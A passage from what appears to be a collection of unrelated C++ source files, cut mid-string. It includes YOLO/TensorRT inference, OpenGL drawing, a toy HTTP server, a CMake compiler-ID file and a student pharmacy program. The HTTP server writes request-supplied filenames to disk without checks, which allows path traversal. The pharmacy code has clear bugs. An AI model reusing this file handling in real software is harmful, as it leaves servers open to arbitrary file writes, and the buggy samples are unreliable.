CHECK(cudaFree(m_input_src_device));\n  CHECK(cudaFree(m_input_resize_device));\n  CHECK(cudaFree(m_input_rgb_device));\n  CHECK(cudaFree(m_input_norm_device));\n  CHECK(cudaFree(m_input_hwc_device));\n  // output\n  CHECK(cudaFree(m_output_src_device));\n  CHECK(cudaFree(m_output_objects_device));\n  CHECK(cudaFree(m_output_idx_device));\n  CHECK(cudaFree(m_output_conf_device));\n  delete[] m_output_objects_host;\n}\n\nbool yolo::YOLO::init(const std::vector<unsigned char> &trtFile) {\n  if (trtFile.empty()) {\n    return false;\n  }\n  std::unique_ptr<nvinfer1::IRuntime> runtime =\n      std::unique_ptr<nvinfer1::IRuntime>(\n          nvinfer1::createInferRuntime(sample::gLogger.getTRTLogger()));\n  if (runtime == nullptr) {\n    return false;\n  }\n  this->m_engine = std::unique_ptr<nvinfer1::ICudaEngine>(\n      runtime->deserializeCudaEngine(trtFile.data(), trtFile.size()));\n\n  if (this->m_engine == nullptr) {\n    return false;\n  }\n  this->m_context = std::unique_ptr<nvinfer1::IExecutionContext>(\n      this->m_engine->createExecutionContext());\n  if (this->m_context == nullptr) {\n    return false;\n  }\n  if (m_param.dynamic_batch) // for some models only support static mutil-batch.\n                             // eg: yolox\n  {\n    this->m_context->setInputShape(\n        this->m_engine->getIOTensorName(0),\n        nvinfer1::Dims4(m_param.batch_size, 3, m_param.dst_h, m_param.dst_w));\n  }\n  m_output_dims =\n      this->m_context->getTensorShape(this->m_engine->getIOTensorName(1));\n  m_total_objects = m_output_dims.d[1];\n  assert(m_param.batch_size <= m_output_dims.d[0]);\n  m_output_area = 1;\n  for (int i = 1; i < m_output_dims.nbDims; i++) {\n    if (m_output_dims.d[i] != 0) {\n      m_output_area *= m_output_dims.d[i];\n    }\n  }\n  CHECK(cudaMalloc(&m_output_src_device,\n                   m_param.batch_size * m_output_area * sizeof(float)));\n  float a = float(m_param.dst_h) / m_param.src_h;\n  float b = float(m_param.dst_w) / m_param.src_w;\n  float scale = a < b ? a : b;\n  cv::Mat src2dst =\n      (cv::Mat_<float>(2, 3) << scale, 0.f,\n       (-scale * m_param.src_w + m_param.dst_w + scale - 1) * 0.5, 0.f, scale,\n       (-scale * m_param.src_h + m_param.dst_h + scale - 1) * 0.5);\n  cv::Mat dst2src = cv::Mat::zeros(2, 3, CV_32FC1);\n  cv::invertAffineTransform(src2dst, dst2src);\n  m_dst2src.v0 = dst2src.ptr<float>(0)[0];\n  m_dst2src.v1 = dst2src.ptr<float>(0)[1];\n  m_dst2src.v2 = dst2src.ptr<float>(0)[2];\n  m_dst2src.v3 = dst2src.ptr<float>(1)[0];\n  m_dst2src.v4 = dst2src.ptr<float>(1)[1];\n  m_dst2src.v5 = dst2src.ptr<float>(1)[2];\n  return true;\n}\n\nvoid yolo::YOLO::check() {\n  nvinfer1::Dims dims;\n\n  sample::gLogInfo << \"the engine's info:\" << std::endl;\n  for (auto layer_name : m_param.input_output_names) {\n    dims = this->m_engine->getTensorShape(layer_name.c_str());\n    sample::gLogInfo << layer_name << \": \";\n    for (int i = 0; i < dims.nbDims; i++) {\n      sample::gLogInfo << dims.d[i] << \", \";\n    }\n    sample::gLogInfo << std::endl;\n  }\n  sample::gLogInfo << \"the context's info:\" << std::endl;\n  for (auto layer_name : m_param.input_output_names) {\n    dims = this->m_context->getTensorShape(lay",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nclass Node\r\n{\r\npublic:\r\n    int data;\r\n    Node *left;\r\n    Node *right;\r\n    Node(int data)\r\n    {\r\n        this->data = data;\r\n        this->left = NULL;\r\n        this->right = NULL;\r\n    }\r\n};\r\n\r\n// To print the tree level wise\r\nvoid levelOrderTraversal(Node *root)\r\n{\r\n    // Empty tree\r\n    if (root == NULL)\r\n    {\r\n        return;\r\n    }\r\n    queue<Node *> q;\r\n    // Push the root in queue\r\n    q.push(root);\r\n    q.push(NULL);\r\n    // Run the loop until queue becomes empty\r\n    while (!q.empty())\r\n    {\r\n        // Fetch front node and then pop\r\n        Node *temp = q.front();\r\n        q.pop();\r\n        if (temp == NULL)\r\n        {\r\n            // go to the next line\r\n            cout << endl;\r\n            // Marking for next level\r\n            if (!q.empty())\r\n            {\r\n                q.push(NULL);\r\n            }\r\n        }\r\n        else\r\n        {\r\n            cout << temp->data << \" \";\r\n            // left child exists\r\n            if (temp->left)\r\n            {\r\n                q.push(temp->left);\r\n            }\r\n            // right child exists\r\n            if (temp->right)\r\n            {\r\n                q.push(temp->right);\r\n            }\r\n        }\r\n    }\r\n}\r\nNode *bstUsingInorder(int inorder[], int s, int e)\r\n{\r\n    // Base Case\r\n    if (s > e)\r\n    {\r\n        return NULL; // Invalid array and hence NULL tree\r\n    }\r\n    // Find middle node\r\n    int mid = s + (e - s) / 2;\r\n    int element = inorder[mid];\r\n    Node *root = new Node(element);\r\n    // Left subtree creation\r\n    root->left = bstUsingInorder(inorder, s, mid - 1);\r\n    // Right subtree creation\r\n    root->right = bstUsingInorder(inorder, mid + 1, e);\r\n    return root;\r\n}\r\nint main()\r\n{\r\n    int inorder[] = {10, 20, 30, 40, 50, 60, 70, 80, 90};\r\n    int s = 0;\r\n    int e = 8;\r\n    Node *root = bstUsingInorder(inorder, s, e);\r\n    levelOrderTraversal(root);\r\n}",
    "#include <GL/glut.h>\n\nvoid init() {\n    glClearColor(0, 0, 1, 1);\n    glMatrixMode(GL_PROJECTION);\n    glOrtho(-100, 100, 100, -100, 100, -100);\n}\n\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT);\n    glColor3f(0, 0, 1);\n    glBegin(GL_QUADS);\n    glVertex2i(-60, -60);\n    glVertex2i(60, -60);\n    glVertex2i(60, 60);\n    glVertex2i(-60, 60);\n    glEnd();\n\n    //pole\n    glColor3f(1, 1, 0);\n    glLineWidth(5.0);\n    glBegin(GL_LINES);\n    glVertex2i(-18, -15);\n    glVertex2i(-18, 35);\n    glEnd();\n\n    //pole's base\n    glColor3ub(78, 85, 89);\n    glBegin(GL_QUADS);\n    glVertex2i(-30, 35);\n    glVertex2i(-30, 45);\n    glVertex2i(5, 45);\n    glVertex2i(5, 35);\n\n    // Draw the red stripe\n    glBegin(GL_QUADS);\n    glColor3f(1, 0, 0);\n    glVertex2i(-18, -15);\n    glVertex2i(-8, -15);\n    glVertex2i(-8, 15);\n    glVertex2i(-18, 15);\n    glEnd();\n\n    // Draw the white stripe\n    glColor3f(1, 1, 1);\n    glBegin(GL_QUADS);\n    glVertex2i(-8, -15);\n    glVertex2i(-8, 15);\n    glVertex2i(8, 15);\n    glVertex2i(8, -15);\n    glEnd();\n\n    // Draw the maple leaf\n    glColor3f(1, 0, 0);\n    glBegin(GL_POLYGON);\n    glVertex2f(0, 0);\n    glVertex2f(-3, 1);\n    glVertex2f(-2.5, 0);\n    glVertex2f(-6.0, -3.5);\n    glVertex2f(-5, -4);\n    glVertex2f(-6, -6);\n    glVertex2f(-4.5, -5);\n    glVertex2f(-3.8, -7);\n    glVertex2f(-2.3, -5);\n    glVertex2f(-2.5, -8.8);\n    glVertex2f(-1.5, -8);\n    glVertex2f(0, -10);\n    glVertex2f(2.5, -8.8);\n    glVertex2f(1.5, -8);\n    glVertex2f(2.3, -5);\n    glVertex2f(3.8, -7);\n    glVertex2f(4.5, -5);\n    glVertex2f(6, -6);\n    glVertex2f(5, -4);\n    glVertex2f(6, -3.5);\n    glVertex2f(2.5, 0);\n    glVertex2f(3, 1);\n    glVertex2f(0, 0);\n    glEnd();\n\n    //line of maple\n    glColor3f(1, 0, 0);\n    glLineWidth(1.0);\n    glBegin(GL_LINES);\n    glVertex2f(0, 0);\n    glVertex2f(0, 5);\n    glEnd();\n\n    // Draw the red stripe\n    glColor3f(1, 0, 0);\n    glBegin(GL_QUADS);\n    glVertex2i(8, -15);\n    glVertex2i(8, 15);\n    glVertex2i(18, 15);\n    glVertex2i(18, -15);\n    glEnd();\n\n    glFlush();\n}\n\nint main(int argc, char** argv) {\n    glutInit(&argc, argv);\n    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n    glutInitWindowPosition(0, 0);\n    glutInitWindowSize(800, 600);\n    glutCreateWindow(\"Flag of Canada\");\n    init();\n    glutDisplayFunc(display);\n    glutMainLoop();\n    return 0;\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <string>\n#include <cstring>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include <vector>\n#include <thread>\n#include <fstream>\n#include <sstream>\n\nstd::string captureAfterKey(const std::string& input) {\n    std::size_t echoPos = input.find(\"/echo/\");\n    if (echoPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 /echo/\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u4ece /echo/ \u540e\u9762\u5f00\u59cb\u67e5\u627e\u7a7a\u683c\n    std::size_t spacePos = input.find(' ', echoPos + 6); // /echo/ \u957f\u5ea6\u4e3a6\n    if (spacePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u7a7a\u683c\uff0c\u53d6\u4ece /echo/ \u540e\u9762\u5230\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u90e8\u5206\n        return input.substr(echoPos + 6);\n    } else {\n        // \u5982\u679c\u627e\u5230\u4e86\u7a7a\u683c\uff0c\u53d6\u7a7a\u683c\u524d\u7684\u90e8\u5206\n        return input.substr(echoPos + 6, spacePos - echoPos - 6);\n    }\n}\n\nstd::string extractUserAgent(const std::string& request) {\n    std::size_t userAgentPos = request.find(\"User-Agent: \");\n    if (userAgentPos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230 User-Agent \u5934\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u627e\u5230 User-Agent \u5934\uff0c\u73b0\u5728\u627e\u5230\u8be5\u884c\u7684\u7ed3\u675f\u4f4d\u7f6e\n    std::size_t endOfLinePos = request.find(\"\\r\\n\", userAgentPos);\n    if (endOfLinePos == std::string::npos) {\n        // \u5982\u679c\u6ca1\u6709\u627e\u5230\u884c\u7ed3\u675f\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\n        return \"\";\n    }\n    // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n    return request.substr(userAgentPos + sizeof(\"User-Agent: \") - 1, endOfLinePos - userAgentPos - sizeof(\"User-Agent: \") + 1);\n}\n\n\nint matchPath(const char *keyword[], int keywordSize, const std::string& path) {\n    for (int i = 0; i < keywordSize; ++i) {\n        if (std::strcmp(keyword[i], path.c_str()) == 0) {\n            return 1; // \u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 1\n        }\n    }\n    return 0; // \u6ca1\u6709\u627e\u5230\u5339\u914d\uff0c\u8fd4\u56de 0\n}\n\nint matchEcho(const std::string& path, const std::vector<std::string>& array) {\n    for (const auto& str : array) {\n        if (path.find(str) != std::string::npos) {\n            return true;\n        }\n    }\n    return false;\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& filePath) {\n    std::ifstream fileStream(filePath, std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content;\n        content.resize(size);\n        if (size > 0) {\n            fileStream.read(&content[0], size);\n        }\n        return content;\n    } else {\n        return \"\";\n    }\n}\n\n// \u65b0\u589e\u51fd\u6570\uff0c\u7528\u4e8e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u8fd4\u56de\nstd::string readFileContent(const std::string& directory, const std::string& filename) {\n    std::ifstream fileStream((directory + \"/\" + filename).c_str(), std::ios::binary | std::ios::ate);\n    if (fileStream) {\n        std::streamsize size = fileStream.tellg();\n        fileStream.seekg(0, std::ios::beg);\n\n        std::string content((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());\n        return content;\n    } else {\n        return \"\";\n    }\n}\nstd::string handlePostRequest(const std::string& request, const std::string& directory) {\n    std::string response;\n    std::string filename;\n    std::string fileContent;\n\n    // \u67e5\u627e POST \u8bf7\u6c42\u6b63\u6587\u7684\u5f00\u59cb\n    size_t postHeaderEnd = request.find(\"\\r\\n\\r\\n\") + 4;\n    if (postHeaderEnd != std::string::npos) {\n        // \u83b7\u53d6 POST \u8bf7\u6c42\u6b63\u6587\u5185\u5bb9\n        fileContent = request.substr(postHeaderEnd);\n\n        // \u63d0\u53d6\u6587\u4ef6\u540d\uff0c\u5047\u8bbe\u5b83\u7d27\u8ddf\u5728 \"POST /files/\" \u4e4b\u540e\n        size_t filenameStart = request.find(\"POST /files/\") + 11;\n        size_t filenameEnd = request.find(\" \", filenameStart); // \u5047\u8bbe\u6587\u4ef6\u540d\u4e4b\u540e\u6709\u4e00\u4e2a\u7a7a\u683c\n        if (filenameEnd != std::string::npos) {\n            filename = request.substr(filenameStart, filenameEnd - filenameStart);\n\n            // \u6784\u9020\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\n            std::string filePath = directory + \"/\" + filename;\n\n            // \u4fdd\u5b58\u6587\u4ef6\n            std::ofstream outFile(filePath, std::ios::binary);\n            if (outFile) {\n                outFile << fileContent;\n                response = \"HTTP/1.1 201 Created\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            } else {\n                response = \"HTTP/1.1 500 Internal Server Error\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n            }\n        } else {\n            response = \"HTTP/1.1 400 Bad Request: Invalid filename\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n        }\n    } else {\n        response = \"HTTP/1.1 400 Bad Request: Invalid POST request format\\r\\nContent-Type: text/plain\\r\\nContent-Length: 0\\r\\n\\r\\n\";\n    }\n\n    return response;\n}\n// \u65b0\u5efa\u51fd\u6570 processRequest \u6765\u5904\u7406\u8bf7\u6c42\nstd::string processRequest(const std::string& request, const std::string& directory, const std::vector<std::string>& keyword) {\n    std::string report;\n    size_t start_pos = request.find(\" \");\n    size_t end_pos = request.find(\" \", start_pos + 1);\n    \n    if (start_pos != std::string::npos && end_pos != std::string::npos) {\n        std::string method = request.substr(0, start_pos);\n        std::string path = request.substr(start_pos + 1, end_pos - start_pos - 1);\n        std::cout << \"Received path: \" << path << std::endl;\n        \n        // \u63d0\u53d6 User-Agent \u5934\u7684\u503c\n        std::st",
    "#include \"Screen.h\"\n#include <iostream>\n\nScreen::Screen() {\n    width = 0;\n    height = 0;\n    screenMatrix = nullptr;\n    matrixSize = 0;\n}\n\nScreen::Screen(int width, int height) {\n    this->width = width;\n    this->height = height;\n    matrixSize = (width + 1) * height;\n\n    screenMatrix = new char[matrixSize];\n    for (int i = 0; i < matrixSize; i++) {\n        if (i % (this->width+1) == this->width) {\n            screenMatrix[i] = '\\n';\n            continue;\n        }\n\n        screenMatrix[i] = ' ';\n    }\n    screenMatrix[matrixSize - 1] = 0;\n}\n\nScreen::~Screen() {\n    delete[] screenMatrix;\n}\n\nScreen& Screen::operator=(const Screen& screen) {\n    delete[] screenMatrix;\n\n    width = screen.width;\n    height = screen.height;\n    matrixSize = screen.matrixSize;\n\n    screenMatrix = new char[matrixSize];\n    for (int i = 0; i < matrixSize; i++) {\n        screenMatrix[i] = screen.screenMatrix[i];\n    }\n    screenMatrix[matrixSize - 1] = 0;\n\n    return *this;\n}\n\nvoid Screen::reset() {\n    for (int i = 0; i < matrixSize; i++) {\n        if (i % (width + 1) == width) {\n            screenMatrix[i] = '\\n';\n            continue;\n        }\n\n        screenMatrix[i] = ' ';\n    }\n    screenMatrix[matrixSize - 1] = 0;\n}\n\nvoid Screen::input(char text, int x, int y) {\n    if (x < 0 || x >= width || y < 0 || y >= height) {\n        return;\n    }\n\n    screenMatrix[x + y * (width+1)] = text;\n}\n\nvoid Screen::rect(char text, int x, int y, int width, int height) {\n    for (int i = x; i < x + width; i++) {\n        for (int j = y; j < y + height; j++) {\n            input(text, i, j);\n        }\n    }\n}\n\nvoid Screen::text(std::string text, int x, int y) {\n    for (int i = 0, j = 0, k = 0; i < text.length(); i++, j++) {\n        if (text[i] == '\\n') {\n            j = -1;\n            k++;\n            continue;\n        }\n        input(text[i], x + j, y + k);\n    }\n}\n\nvoid Screen::print() {\n    std::cout << \"\\x1b[?25l\\x1b[1;1H\";\n\n    //printout += \"\\x1b[38;2;255;255;0m\";\n\n    std::cout << screenMatrix;\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include<iostream>\r\n#include<vector>\r\n#include<fstream>\r\nusing namespace std;\r\nstruct pharmacy{\r\n\tchar id;\r\n\tstring name;\r\n\tint quantity;\r\n\tint price;\r\n};\r\n    pharmacy phar;\r\n    vector<pharmacy> medics;\r\n   \r\n    addval(){\r\n    \tint choice;\r\n    \tdo{\r\n    \t\tcout<<\"Id: \";cin>>phar.id;\r\n    \t\tcout<<\"Name: \";cin>>phar.name;\r\n    \t\tcout<<\"quantity: \";cin>>phar.quantity;\r\n    \t\tcout<<\"price: \";cin>>phar.price;\r\n    \t\tmedics.push_back(phar);\r\n    \t\tcout<<\"save successfuly\"<<endl;\r\n    \t\tcout<<\"enter '0' for exit or '1' for continue: \";cin>>choice;\r\n\t\t}\r\n\t\twhile(choice!=0 && choice ==1);\r\n\t}\r\n\t\r\n\tsearch(){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<i+1<<\". name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<i+1<<\". quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<i+1<<\". price:\"<<medics[i].price<<endl<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tdel (){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tmedics.erase(medics.begin()+i);\r\n\t\t\t\tcout<<\"deleted \"<<medics[i].name<<endl<<endl;\r\n\t\t\t}\r\n\t}\r\n}\r\n\tshow(){\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<\" name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<\" quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<\" price:\"<<medics[i].price<<endl<<endl;\t\r\n\t\t}\r\n\t}\r\n\t\r\n\t\tsave(const vector<pharmacy>&medics, const string& medical){\r\n\t\tofstream out(\"D:/medical.txt\");\r\n\t\tif(!out){\r\n\t\t\tcerr<<\"file not found: \"<<medical<<endl;\r\n\t\t}\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\t\tout<<i+1<<\"Id: \"<<medics[i].id<<endl<<\" name:\"<<medics[i].name<<endl\r\n\t\t\t<<\"quantity: \"<<medics[i].quantity<<endl<<\"price: \"<<medics[i].price<<endl;\r\n\t\t}\r\n\t\tout.close();\r\n\t\tcout<<\"medicines saved to file \"<<medical<<endl<<endl;\r\n\t\t}\r\n\t\r\n\t\r\n    int main(){\r\n    \twhile(true){\r\n    \t\tint value;\r\n    \t\tcout<<\"\\t\\t===================\\n\\n\";\r\n\t\t    cout<<\"\\t\\t-------------------\\n\";\r\n\t\t        cout<<\"1.for add medicines: \"<<endl;\r\n    \t     \tcout<<\"2.for search medicines: \"<<endl;\r\n    \t\t    cout<<\"3.for delete medicines: \"<<endl;\r\n    \t\t    cout<<\"4.for show all medicines: \"<<endl;\r\n    \t\t    cout<<\"5.for save medicines to file: \"<<endl;\r\n    \t    \tcout<<\"6.for exit from program: \"<<endl;\r\n    \t    \tcout<<\"\\t\\t---------------------\\n\";\r\n    \t\tcout<<\"type here:\";cin>>value;\r\n    \t\tswitch(value){ system(\"cls\");\r\n    \t\t\tcase 1:{\r\n\t\t\t\t\taddval();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 2:{        system(\"cls\");\r\n\t\t\t\t\tsearch();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 3:{        system(\"cls\");\r\n\t\t\t\t\tdel();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 4:{        system(\"cls\");\r\n\t\t\t\t\tshow();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 5:{\r\n\t\t\t\t\tsave(medics, \"D:/medical.txt\" );\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 6:{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{system(\"cls\"); cout<<\"invalid input \"<<endl<<endl;}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n",
    "// dear imgui, v1.90.6 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read top of imgui.cpp and imgui.h for many details, documentation, comments, links.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the 